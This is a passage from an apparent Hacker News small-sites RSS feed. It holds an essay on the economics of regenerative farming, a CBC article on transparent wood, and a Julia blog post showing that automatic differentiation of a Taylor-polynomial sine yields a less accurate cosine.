crops for much cheaper on a U.S. dollar denominated basis. Instead, let’s build ways to maximize the government efforts for keeping the markets open whill still providing incentive for regenerative practices. One way the government (USDA) <em>can</em> <em>help</em> with the technical challenges of cover crops is many crop specie have not been bred/modified for these purposes. With the advanced genetic tooling available to scientists today, there is no reason these species (rye, mustard, radishes, buckwheat, grasses, etc.) can’t be modified for having cover crop desirable traits. Many of these species have been forgotten or neglected by large multi-national companies because of the inability to capitalize a profit on them. They are inherently low-margin.</p>



<p>Farmers, society, the environment, and the government all have the potential to ‘win’ by adopting sustainable soil practices:</p>



<ul><li>Farmers: More fertile ground equates to more productive harvests for commodity or cash crops</li><li>Society: More carbon is sequestered mitigating climate/water quality changes</li><li>Environment: Living roots growing on ground 365 days of the year allows for healthier ecosystem</li><li>Government: Building resiliency into food supply sources can help keep food prices stable</li></ul>



<p>I continue to posit farmers don’t do these practices is <em>not</em> because of lack of understanding or some inherent nihilistic mindset: it is because they are footing the bill. If done at scale, the sole purpose of a cover crop will be to sequester carbon. It costs <a rel="noreferrer noopener" href="https://www.extension.iastate.edu/agdm/crops/pdf/a3-10.pdf" data-type="URL" data-id="https://www.extension.iastate.edu/agdm/crops/pdf/a3-10.pdf" target="_blank">no less than $15 per acre</a> to plant a cover crop. The <a rel="noreferrer noopener" href="https://nori.com/" data-type="URL" data-id="https://nori.com/" target="_blank">market rates</a> for a ton of carbon are about $15. Only <a rel="noreferrer noopener" href="http://comet-farm.com/" data-type="URL" data-id="http://comet-farm.com/" target="_blank">0.20-0.40 tons per acre</a> can be realistically captured assuming we just want to add cover crops to existing row crops acres. Soil friendly practices such as grasslands <a rel="noreferrer noopener" href="https://www.fsa.usda.gov/Assets/USDA-FSA-Public/usdafiles/Conservation/PDF/One-Pager%20December%202020.pdf" data-type="URL" data-id="https://www.fsa.usda.gov/Assets/USDA-FSA-Public/usdafiles/Conservation/PDF/One-Pager%20December%202020.pdf" target="_blank">pay only $13 per acre</a>. There is simply no profit for the farmer–why would they willingly adapt unprofitable practices? The USDA can help bridge that via policy changes. They already make unprofitable endeavors profitable via subsidies. They can jump start the mass adoption of cover crops this way. The private sector is probably doomed to fail; carbon markets from companies like <a rel="noreferrer noopener" href="https://nori.com/" data-type="URL" data-id="https://nori.com/" target="_blank">Nori</a>, <a rel="noreferrer noopener" href="https://www.fbn.com/" data-type="URL" data-id="https://www.fbn.com/" target="_blank">FBN</a>, <a rel="noreferrer noopener" href="https://www.indigoag.com/for-growers/indigo-carbon" data-type="URL" data-id="https://www.indigoag.com/for-growers/indigo-carbon" target="_blank">Indigo</a> are <span>not</span> a sustainable solution because these are extension of the <span>current</span> agriculture input scene that is designed to squeeze farmers and add overhead so that companies can be profitable. At best, these companies will want to leverage their carbon markets to lock-in farmers to other profitable revenue streams.</p>



<p>The final reason why I believe achieving regenerative agriculture practices at scale is not an education problem but an economic one is this: The farmers <em>currently</em> doing these practices who are the cited sources for being profitable are outliers. They likely represent some sort of top percentile as far as ‘farmers’ can be ranked. Although not real data, this confirms my own experience in talking with people who are doing this (and presumably haven’t been bankrupted by it). These farmers represent a different mindset in that they don’t want to be sold anything, but rather figure it out by themselves whereas the vast majority of ‘normal’ farmers look to experts for advice and recommendations–see the financial success of agriculture input companies for confirmation. But these successful farmers own admission, maintaining profitability on a ‘non-traditional’ operation is difficult and requires much trial and error. The entire system must have proper synergy and be hedged appropriately. There is also an infinite combination of ‘successful paths’ so no 2 farms will likely be the same. This is mostly in stark contrast to the trend of homogenization of the farm in the post-GMO era where many farmers are simply planting vanilla maize/soybean rotations using the same set of chemicals. I am a believer that outliers don’t scale, so its not about really sharp people simply educating the masses. It’s analogous to attempting scaling the concept of a ’10x developer’ in software engineering via education. Much like no amount of education will turn the majority of software engineers into a 10x developer, If we think we can turn every farmer into a 10x farmer, we will fail. Focus on getting the economic side shored up, the technical side will follow easily.</p>



<p><em>Author can be reach at admin [at] thinkingagriculture.io</em></p>
		</div><!-- .entry-content -->

					<!-- .entry-meta -->
				</div><!-- .inside-article -->
</article><!-- #post-## -->
		</main><!-- #main -->
	</div><!-- #primary -->

	<!-- #secondary -->

	</div><!-- #content -->
</div></div>]]>
            </description>
            <link>https://thinkingagriculture.io/on-sustainability-in-agriculture/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26069493</guid>
            <pubDate>Mon, 08 Feb 2021 20:12:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Husky, a popular JavaScript project with 4M weekly downloads, drops MIT license]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 2 (<a href="https://news.ycombinator.com/item?id=26069294">thread link</a>) | @gajus
<br/>
February 8, 2021 | https://typicode.github.io/husky/#/?id=license | <a href="https://web.archive.org/web/*/https://typicode.github.io/husky/#/?id=license">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://typicode.github.io/husky/#/?id=license</link>
            <guid isPermaLink="false">hacker-news-small-sites-26069294</guid>
            <pubDate>Mon, 08 Feb 2021 19:56:19 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Scientists develop transparent wood that is stronger and lighter than glass]]>
            </title>
            <description>
<![CDATA[
Score 88 | Comments 29 (<a href="https://news.ycombinator.com/item?id=26068435">thread link</a>) | @ooboe
<br/>
February 8, 2021 | https://www.cbc.ca/radio/quirks/scientists-develop-transparent-wood-that-is-stronger-and-lighter-than-glass-1.5902739 | <a href="https://web.archive.org/web/*/https://www.cbc.ca/radio/quirks/scientists-develop-transparent-wood-that-is-stronger-and-lighter-than-glass-1.5902739">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>Bob McDonald's blog: A simple backyard procedure results in see-through wood with enormous potential as a building material.</p><div><figure><div><p><img loading="lazy" alt="" srcset="" sizes="" src="https://i.cbc.ca/1.5902788.1612553036!/fileImage/httpImage/image.jpg_gen/derivatives/16x9_780/transparent-wood-university-of-maryland.jpg"></p></div><figcaption>A flower is visible behind a piece of the transparent material.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure><p><span><p>Researchers at the University of Maryland have turned ordinary sheets of wood into <a href="https://advances.sciencemag.org/content/7/5/eabd7342" target="_blank"><u>transparent material</u></a> that is nearly as clear as glass, but stronger and with better insulating properties. It could become an energy efficient building material in the future.</p>  <p>Wood is made of two basic ingredients: cellulose, which are tiny fibres, and lignin, which bonds those fibres together to give it strength.</p>  <p>Tear a paper towel in half and look closely along the edge. You will see the little cellulose fibres sticking up. Lignin is a glue-like material that bonds the fibres together, a little like the plastic resin in fibreglass or carbon fibre. The lignin also contains molecules called chromophores, which give the wood its brown colour and prevent light from passing through.</p>  <p>Early attempts to make transparent wood involved removing the lignin, but this involved hazardous chemicals, high temperatures and a lot of time, making the product expensive and somewhat brittle. The new technique is so cheap and easy it could literally be done in a backyard.</p>  <p>Starting with planks of wood a metre long and one millimetre thick, the scientists simply brushed on a solution of hydrogen peroxide using an ordinary paint brush. When left in the sun, or under a UV lamp for an hour or so, the peroxide bleached out the brown chromophores but left the lignin intact, so the wood turned white.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902789.1612553066!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-university-of-maryland.jpg"></p></div><figcaption>Researchers demonstrated after brushing a coat of hydrogen peroxide on the opaque wood material, and exposing it to one hour of sunlight, it turns transparent.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Next, they infused the wood with a tough transparent epoxy designed for marine use, which filled in the spaces and pores in the wood and then hardened.&nbsp;This made the white wood transparent.</p>  <p>You can see a similar effect by taking that same piece of paper towel, dip half of it in water and place it on a patterned surface.&nbsp;The white paper towel will become translucent with light passing through the water and cellulose fibres without being scattered by refraction.</p>  <p>The epoxy in the wood does an even better job, allowing 90 per cent of visible light to pass through. The result is a long piece of what looks like glass, with the strength and flexibility of wood.</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902790.1612552994!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-usda-forest-service-jpg.jpg 300w,https://i.cbc.ca/1.5902790.1612552994!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-usda-forest-service-jpg.jpg 460w,https://i.cbc.ca/1.5902790.1612552994!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-usda-forest-service-jpg.jpg 620w,https://i.cbc.ca/1.5902790.1612552994!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-usda-forest-service-jpg.jpg 780w,https://i.cbc.ca/1.5902790.1612552994!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-usda-forest-service-jpg.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902790.1612552994!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-usda-forest-service-jpg.jpg"></p></div><figcaption>A researcher holds up a square of transparent wood material against a green leaf.<!-- --> <!-- -->(USDA Forest Service)</figcaption></figure></span></p>  <p>As window material, it would be much more resistant to accidental breakage. The clear wood&nbsp;is lighter than glass, with better insulating properties, which is important because windows are a major source of heat loss in buildings. It also might take less energy to manufacture clear wood because there are no high temperatures involved.</p>  <p>Transparent wood could become an alternative to glass in energy efficient buildings, or perhaps coverings for solar panels in harsh environments. There could be no end of uses.</p>      <p>Many different types of wood, from balsa to oak, can be made transparent, and it doesn't matter if it is cut along the grain or against it. If the transparent wood is made a little thicker, it would be strong enough to become part of the structure of a building, so there could be entire transparent wooden walls.</p>  <p>While this technology has yet to&nbsp; be scaled up to industrial levels, the researchers say it has great potential as a new building material. In fact, they say that theoretically, an entire house could be made transparent. It is not clear why anyone would want to live in a transparent house, but for people who do, it would be OK to throw stones…</p>  <p><span><figure><div><p><img loading="lazy" alt="" srcset="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_300/transparent-wood-qinqin-xia-university-of-maryland.jpg 300w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_460/transparent-wood-qinqin-xia-university-of-maryland.jpg 460w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_620/transparent-wood-qinqin-xia-university-of-maryland.jpg 620w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg 780w,https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_1180/transparent-wood-qinqin-xia-university-of-maryland.jpg 1180w" sizes="(max-width: 300px) 300px,(max-width: 460px) 460px,(max-width: 620px) 620px,(max-width: 780px) 780px,(max-width: 1180px) 1180px" src="https://i.cbc.ca/1.5902787.1612553101!/fileImage/httpImage/image.jpg_gen/derivatives/original_780/transparent-wood-qinqin-xia-university-of-maryland.jpg"></p></div><figcaption>A researcher holds up a 10-centimetre long slab of the see-through wood.<!-- --> <!-- -->(Qinqin Xia, University of Maryland/Science Advances)</figcaption></figure></span></p>  <p>Images copyright Xia et al.&nbsp;<a href="https://creativecommons.org/licenses/by-nc/4.0/" rel="license">Creative Commons Attribution-NonCommercial license</a>,&nbsp;</p></span></p></div></div>]]>
            </description>
            <link>https://www.cbc.ca/radio/quirks/scientists-develop-transparent-wood-that-is-stronger-and-lighter-than-glass-1.5902739</link>
            <guid isPermaLink="false">hacker-news-small-sites-26068435</guid>
            <pubDate>Mon, 08 Feb 2021 18:50:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Automatic differentiation does incur truncation errors (kinda)]]>
            </title>
            <description>
<![CDATA[
Score 79 | Comments 42 (<a href="https://news.ycombinator.com/item?id=26068382">thread link</a>) | @oxinabox
<br/>
February 8, 2021 | https://www.oxinabox.net/2021/02/08/AD-truncation-error.html | <a href="https://web.archive.org/web/*/https://www.oxinabox.net/2021/02/08/AD-truncation-error.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main_content">
      <p>Griewank and Walther’s 0th Rule of algorithmic differentiation (AD) states:</p>

<blockquote>
  <p>Algorithmic differentiation does not incur truncation error.</p>
</blockquote>

<p>(<a href="https://dl.acm.org/doi/book/10.5555/1455489">2008, “Evaluating Derivatives: Principles and Techniques of Algorithmic Differentiation”, Andreas Griewank and Andrea Walther.</a>)</p>

<p>In this blog post I will show you a case that looks like it does in fact incur truncation error.
Though this case will arguably be a misinterpretation of that rule.
This blog post will thus highlight why careful interpretation of the rule is necessary.
Further it will motivate why we need to often add more custom sensitivity rules (custom primitives) to our AD systems, even though you can AD anything with just a few basic rules.</p>

<p>Credit to <a href="https://mikeinnes.github.io/">Mike Innes</a> who pointed this out to me at JuliaCon 2018.
<!--more--></p>



<p>We will start by implementing a simple forwards mode AD.
This implementation is based on <a href="https://juliadiff.org/ChainRulesCore.jl/dev/autodiff/operator_overloading.html#ForwardDiffZero">ForwardDiffZero from the ChainRules docs.</a>, but without ChainRules support.
Though it is also the simplest most stock-standard implementation once can conceive of.</p>

<div><div><pre><code><span>struct</span><span> Dual</span> <span>&lt;:</span> <span>Number</span>
    <span>primal</span><span>::</span><span>Float64</span>
    <span>partial</span><span>::</span><span>Float64</span>
<span>end</span>

<span>primal</span><span>(</span><span>d</span><span>::</span><span>Dual</span><span>)</span> <span>=</span> <span>d</span><span>.</span><span>primal</span>
<span>partial</span><span>(</span><span>d</span><span>::</span><span>Dual</span><span>)</span> <span>=</span> <span>d</span><span>.</span><span>partial</span>

<span>primal</span><span>(</span><span>d</span><span>::</span><span>Number</span><span>)</span> <span>=</span> <span>d</span>
<span>partial</span><span>(</span><span>d</span><span>::</span><span>Number</span><span>)</span> <span>=</span> <span>0.0</span>

<span>function</span><span> Base.:+</span><span>(</span><span>a</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>},</span> <span>b</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>})</span> <span>where</span> <span>T</span><span>&lt;:</span><span>Real</span>
    <span>return</span> <span>Dual</span><span>(</span><span>primal</span><span>(</span><span>a</span><span>)</span><span>+</span><span>primal</span><span>(</span><span>b</span><span>),</span> <span>partial</span><span>(</span><span>a</span><span>)</span><span>+</span><span>partial</span><span>(</span><span>b</span><span>))</span>
<span>end</span>

<span>function</span><span> Base.:</span><span>-</span><span>(</span><span>a</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>},</span> <span>b</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>})</span> <span>where</span> <span>T</span><span>&lt;:</span><span>Real</span>
    <span>return</span> <span>Dual</span><span>(</span><span>primal</span><span>(</span><span>a</span><span>)</span><span>-</span><span>primal</span><span>(</span><span>b</span><span>),</span> <span>partial</span><span>(</span><span>a</span><span>)</span><span>-</span><span>partial</span><span>(</span><span>b</span><span>))</span>
<span>end</span>

<span>function</span><span> Base.:*</span><span>(</span><span>a</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>},</span> <span>b</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>})</span> <span>where</span> <span>T</span><span>&lt;:</span><span>Real</span>
    <span>return</span> <span>Dual</span><span>(</span>
        <span>primal</span><span>(</span><span>a</span><span>)</span><span>*</span><span>primal</span><span>(</span><span>b</span><span>),</span>
        <span>partial</span><span>(</span><span>a</span><span>)</span><span>*</span><span>primal</span><span>(</span><span>b</span><span>)</span> <span>+</span> <span>primal</span><span>(</span><span>a</span><span>)</span><span>*</span><span>partial</span><span>(</span><span>b</span><span>)</span>
    <span>)</span>
<span>end</span>

<span>function</span><span> Base.:/</span><span>(</span><span>a</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>},</span> <span>b</span><span>::</span><span>Union</span><span>{</span><span>Dual</span><span>,</span> <span>T</span><span>})</span> <span>where</span> <span>T</span><span>&lt;:</span><span>Real</span>
    <span>return</span> <span>Dual</span><span>(</span>
        <span>primal</span><span>(</span><span>a</span><span>)</span><span>/</span><span>primal</span><span>(</span><span>b</span><span>),</span>
        <span>(</span><span>partial</span><span>(</span><span>a</span><span>)</span><span>*</span><span>primal</span><span>(</span><span>b</span><span>)</span> <span>-</span> <span>primal</span><span>(</span><span>a</span><span>)</span><span>*</span><span>partial</span><span>(</span><span>b</span><span>))</span> <span>/</span> <span>primal</span><span>(</span><span>b</span><span>)</span><span>^</span><span>2</span>
    <span>)</span>
<span>end</span>

<span># needed for `^` to work from having `*` defined</span>
<span>Base</span><span>.</span><span>to_power_type</span><span>(</span><span>x</span><span>::</span><span>Dual</span><span>)</span> <span>=</span> <span>x</span>


<span>"Do a calculus. `f` should have a single input."</span>
<span>function</span><span> derv</span><span>(</span><span>f</span><span>,</span> <span>arg</span><span>)</span>
    <span>duals</span> <span>=</span> <span>Dual</span><span>(</span><span>arg</span><span>,</span> <span>1.0</span><span>)</span>
    <span>return</span> <span>partial</span><span>(</span><span>f</span><span>(</span><span>duals</span><span>...</span><span>))</span>
<span>end</span>
</code></pre></div></div>

<p>We can try out this AD and see that it works.</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>foo</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>x</span><span>^</span><span>3</span> <span>+</span> <span>x</span><span>^</span><span>2</span> <span>+</span> <span>1</span><span>;</span>

<span>julia</span><span>&gt;</span> <span>derv</span><span>(</span><span>foo</span><span>,</span> <span>20.0</span><span>)</span>
<span>1240.0</span>

<span>julia</span><span>&gt;</span> <span>3</span><span>*</span><span>(</span><span>20.0</span><span>)</span><span>^</span><span>2</span> <span>+</span> <span>2</span><span>*</span><span>(</span><span>20.0</span><span>)</span>
<span>1240.0</span>
</code></pre></div></div>

<h2 id="2-implement-sin-and-cos-for-demonstration-purposes">2. Implement Sin and Cos, for demonstration purposes</h2>

<p>Now we are going to implement the <code>sin</code> and <code>cos</code> functions for demonstration purposes.
<a href="https://github.com/JuliaLang/julia/blob/v1.5.3/base/special/trig.jl">JuliaLang has an implementation of <code>sin</code> and <code>cos</code> in Julia</a>, that could be ADed though by a source to source AD (like <a href="https://github.com/FluxML/Zygote.jl">Zygote.jl</a>).
But because it is restricted to <code>Float32</code> and <code>Float64</code> an operator overloading AD like ours can’t be used with it.
That’s Ok we will just code up a simple one using Taylor polynomials.
we know that eventually the code run does have to look something like this, since all operations are implemented in terms of <code>+</code>, <code>*</code> and <code>^</code>, <code>/</code>, bit-shifts and control-flow.
(Technically <a href="https://en.wikipedia.org/wiki/X86_instruction_listings#Added_with_80387">x86 assembly</a> does have a primitive for <code>sin</code> and <code>cos</code> but as far as I know no LibM actually uses them. There is a <a href="https://reviews.llvm.org/D36344">discussion of why LLVM</a> doesn’t ever emit them if you go looking)
The real code would include control flow to wrap around large values and stay close to zero, but we can skip that and just avoid inputting large values.</p>

<p>So using Taylor polynomials of degree 12 for each of them:</p>

<div><div><pre><code><span>my_sin</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>x</span> <span>-</span> <span>x</span><span>^</span><span>3</span><span>/</span><span>factorial</span><span>(</span><span>3</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>5</span><span>/</span><span>factorial</span><span>(</span><span>5</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>7</span><span>/</span><span>factorial</span><span>(</span><span>7</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>9</span><span>/</span><span>factorial</span><span>(</span><span>9</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>11</span><span>/</span><span>factorial</span><span>(</span><span>11</span><span>)</span>  <span># + 0*x^12</span>

<span>my_cos</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span>-</span> <span>x</span><span>^</span><span>2</span><span>/</span><span>factorial</span><span>(</span><span>2</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>4</span><span>/</span><span>factorial</span><span>(</span><span>4</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>6</span><span>/</span><span>factorial</span><span>(</span><span>6</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>8</span><span>/</span><span>factorial</span><span>(</span><span>8</span><span>)</span> <span>-</span> <span>x</span><span>^</span><span>10</span><span>/</span><span>factorial</span><span>(</span><span>10</span><span>)</span> <span>+</span> <span>x</span><span>^</span><span>12</span><span>/</span><span>factorial</span><span>(</span><span>12</span><span>)</span>
</code></pre></div></div>

<p>Check the accuracy
we know that  <code>sin(π/3) == √3/2</code>, and that <code>cos(π/3) == 1/2</code>
(note that yes, <code>π</code> and <code>√3/2</code> are  approximating here but they are very accurate one. And this doesn’t change the result that follows.)</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>my_sin</span><span>(</span><span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.8660254034934827</span>

<span>julia</span><span>&gt;</span> <span>√3</span><span>/</span><span>2</span>
<span>0.8660254037844386</span>

<span>julia</span><span>&gt;</span> <span>abs</span><span>(</span><span>√3</span><span>/</span><span>2</span> <span>-</span> <span>my_sin</span><span>(</span><span>π</span><span>/</span><span>3</span><span>))</span>
<span>2.9095592601890985e-10</span>

<span>julia</span><span>&gt;</span> <span>my_cos</span><span>(</span><span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.5000000000217777</span>

<span>julia</span><span>&gt;</span> <span>abs</span><span>(</span><span>0.5</span> <span>-</span> <span>my_cos</span><span>(</span><span>π</span><span>/</span><span>3</span><span>))</span>
<span>2.177769076183722e-11</span>
</code></pre></div></div>

<p>This is not terrible.
<code>cos</code> is slightly more accurate than <code>sin</code>. 
We have a fairly passable implementation of <code>sin</code> and <code>cos</code>.</p>

<h2 id="3-now-lets-do-ad">3. Now lets do AD.</h2>

<p>We know the derivative of <code>sin(x)</code> is <code>cos(x)</code>.
So if we take the derivative of <code>my_sin(π/3)</code> we should get <code>my_cos(π/3)≈0.5</code>.
<em>It should be as accurate as the original implementation, right?</em>
because Griewank and Walther’s 0th Rule:</p>

<blockquote>
  <p>Algorithmic differentiation does not incur truncation error.</p>
</blockquote>

<div><div><pre><code><span>julia</span><span>&gt;</span> <span>derv</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.4999999963909431</span>
</code></pre></div></div>
<p>Wait a second.
That doesn’t seem accurate, we expected 0.5, or at least something pretty close to that.
<code>my_cos</code> was accurate to $2 \times 10^{-11}$.
<code>my_sin</code> was accurate to $3 \times 10^{-10}$
How accurate is this:</p>
<pre><code>julia&gt; abs(derv(my_sin, π/3) - 0.5)
3.609056886677564e-9
</code></pre>

<p>What went wrong?</p>

<h2 id="4-verify">4. Verify</h2>

<p>Now, I did implement an AD from scratch there.
So maybe you are thinking that I screwed it up.
Maybe a reverse mode AD would not suffer from this problem; or maybe one that uses source to source?
Lets try some of Julia’s many AD systems then.</p>

<div><div><pre><code><span>julia</span><span>&gt;</span> <span>import</span> <span>ForwardDiff</span><span>,</span> <span>ReverseDiff</span><span>,</span> <span>Nabla</span><span>,</span> <span>Yota</span><span>,</span> <span>Zygote</span><span>,</span> <span>Tracker</span><span>,</span> <span>Enzyme</span><span>;</span>

<span>julia</span><span>&gt;</span> <span>ForwardDiff</span><span>.</span><span>derivative</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.4999999963909432</span>

<span>julia</span><span>&gt;</span> <span>ReverseDiff</span><span>.</span><span>gradient</span><span>(</span><span>x</span><span>-&gt;</span><span>my_sin</span><span>(</span><span>x</span><span>[</span><span>1</span><span>]),</span> <span>[</span><span>π</span><span>/</span><span>3</span><span>,])</span>
<span>1</span><span>-</span><span>element</span> <span>Vector</span><span>{</span><span>Float64</span><span>}</span><span>:</span>
 <span>0.4999999963909433</span>

<span>julia</span><span>&gt;</span> <span>Nabla</span><span>.</span><span>∇</span><span>(</span><span>my_sin</span><span>)(</span><span>π</span><span>/</span><span>3</span><span>)</span>
<span>(</span><span>0.4999999963909433</span><span>,)</span>

<span>julia</span><span>&gt;</span> <span>Yota</span><span>.</span><span>grad</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)[</span><span>2</span><span>][</span><span>1</span><span>]</span>
<span>0.4999999963909433</span>

<span>julia</span><span>&gt;</span> <span>Zygote</span><span>.</span><span>gradient</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>(</span><span>0.4999999963909433</span><span>,)</span>

<span>julia</span><span>&gt;</span> <span>Tracker</span><span>.</span><span>gradient</span><span>(</span><span>my_sin</span><span>,</span> <span>π</span><span>/</span><span>3</span><span>)</span>
<span>(</span><span>0.4999999963909432</span> <span>(</span><span>tracked</span><span>),)</span>

<span>julia</span><span>&gt;</span> <span>Enzyme</span><span>.</span><span>autodiff</span><span>(</span><span>my_sin</span><span>,</span> <span>Active</span><span>(</span><span>π</span><span>/</span><span>3</span><span>))</span>
<span>0.4999999963909432</span>
</code></pre></div></div>

<p>Ok, I just tried <strong>7</strong> AD systems based on totally different implementations.
I mean <a href="https://github.com/wsmoses/Enzyme.jl/">Enzyme</a> is reverse mode running at the LLVM level.
Totally different from <a href="https://github.com/JuliaDiff/ForwardDiff.jl">ForwardDiff</a> which is the more mature version of the forward mode operator overloading AD I coded above.
Every single one agreed with my result, up to <a href="https://en.wikipedia.org/wiki/Unit_in_the_last_place">1 ULP</a>.
I think that last digit changing is probably to do with order of addition (IEEE floating point math is funky), but that is another blog-post.
So I think we can reliably say that this is what an AD system will output when asked for the derivative of <code>my_sin</code> at <code>π/3</code>.</p>

<h2 id="5-explanation">5. Explanation</h2>

<p>Why does AD seem to be incurring truncation errors?
Why is the derivative of <code>my_sin</code> much less accurate than <code>my_cos</code>?</p>

<p>The AD system is (as you might have surmised) not incurring truncation errors.
It is giving us exactly what we asked for, which is the derivative of <code>my_sin</code>.
<code>my_sin</code> is a polynomial.
The derivative of the polynomial is:</p>
<div><div><pre><code><span>d_my_sin</span><span>(</span><span>x</span><span>)</span> <span>=</span> <span>1</span> <span>-</span> <span>3</span><span>x</span><span>^</span><span>2</span><span>/</span><span>factorial</span><span>(</span><span>3</span><span>)</span> <span>+</span> <span>5</span><span>x</span><span>^</span><span>4</span><span>/</span><span>factorial</span><span>(</span><span>5</span><span>)</span> <span>-</span> <span>7</span><span>x</span><span>^</span><span>6</span><span>/</span><span>factorial</span><span>(</span><span>7</span><span>)</span> <span>+</span> <span>9</span><span>x</span><span>^</span><span>8</span><span>/</span><span>factorial</span><span>(</span><span>9</span><span>)</span> <span>-</span> <span>11</span><span>x</span><span>^</span><span>10</span><span>/</span><span>factorial</span><span>(</span><span>11</span><span>)</span>
</code></pre></div></div>
<p>which indeed does have</p>
<div><div><pre><code><span>julia</span><span>&gt;</span> <span>d_my_sin</span><span>(</span><span>π</span><span>/</span><span>3</span><span>)</span>
<span>0.4999999963909432</span>
</code></pre></div></div>
<p><code>d_my_sin</code> is a lower degree polynomial approximation to <code>cos</code> than <code>my_cos</code> was, so it is less accurate.
Further, you can see that while n-derivative of <code>sin</code> is always defined as <code>sin(x+n*π/2)</code>, as we keep taking derivatives of the polynomial approximations terms keep getting dropped.
AD is making it smoother and smoother til it is just a flat <code>0</code>.</p>

<p>The key take away here is that <em>the map is not the territory</em>.
Most nontrivial functions on computers are implemented as some function that that approximates (<em>the map</em>) the mathematical ideal (<em>the territory</em>).
Automatic differentiation gives back a completely accurate derivative of the that function (<em>the map</em>) doing the approximation.
<em>Furthermore, the accurate derivative of an approximation to the idea (e.g <code>d_my_sin</code>), is less accurate than and approximation to the (ideal) derivative of the ideal (e.g. <code>my_cos</code>).</em>
There is no truncation error in the work the AD did; but there is a truncation error in the sense that we are now using a more truncated approximation that we would write ourselves.</p>

<p>So what do?
Well-firstly, do you want to do anything?
Maybe the derivative of the approximation is more useful.
(I have been told that this is the case for some optimal control problems).
But if we want to fix it can we?
Yes, the answer is to insert domain knowledge, telling the AD system directly what the approximation to the derivative of the ideal is.
The AD system doesn’t know its working with an approximation, and even if it did, it doesn’t know what the idea it is approximating is.
The way to tell it is with a custom primitive i.e. a custom sensitivity rule.
This is what the ChainRules project in Julia is about, being able to add custom primitives for more things.</p>

<p>Every real AD system already has a primitive for <code>sin</code> built in
(which is one of the reasons I had to define my own above).
but it won’t have one for every novel system you approximate.
E.g. for things defined in terms of differential equation solutions or other iterative methods.</p>

<p>We can define in our toy AD at the start this custom primitive via:</p>
